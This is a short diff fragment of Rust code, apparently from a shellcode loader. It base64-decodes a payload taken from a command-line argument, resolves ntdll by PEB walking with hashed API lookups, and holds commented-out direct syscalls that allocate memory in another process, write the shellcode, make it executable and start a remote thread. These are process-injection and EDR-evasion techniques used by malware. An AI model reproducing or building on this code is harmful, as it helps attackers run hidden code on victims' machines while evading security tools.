@@ -1,0 +1,10 @@
+        let sc = base64::decode(args[1].as_bytes()).unwrap();
+        //let VrtAddr: *mut u8 = null_mut();
+        let hNtdll = PebGetModule(0x1edab0ed);
+        //syscall!(std::mem::transmute(PeGetFuncEat(hNtdll, 0xf783b8ec)), proc_info.hProcess, &VrtAddr, 0, &sc.len(), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
+        //syscall!(std::mem::transmute(PeGetFuncEat(hNtdll, 0xc3170192)), proc_info.hProcess, VrtAddr, sc.as_ptr(), sc.len(), null_mut::<*mut u8>());
+        //let mut oldProtect = 0;
+        //syscall!(std::mem::transmute(PeGetFuncEat(hNtdll, 0x50e92888)), proc_info.hProcess, &VrtAddr, &sc.len(), PAGE_EXECUTE_READ, &mut oldProtect);
+        //let mut hThread: isize = 0;
+        //syscall!(std::mem::transmute(PeGetFuncEat(hNtdll, 0xaf18cfb0)), &hThread, 33554432u32, null_mut::<*mut u8>(), proc_info.hProcess, VrtAddr, null_mut::<*mut u8>(), 0, 0, 0, 0, null_mut::<*mut u8>());
+    
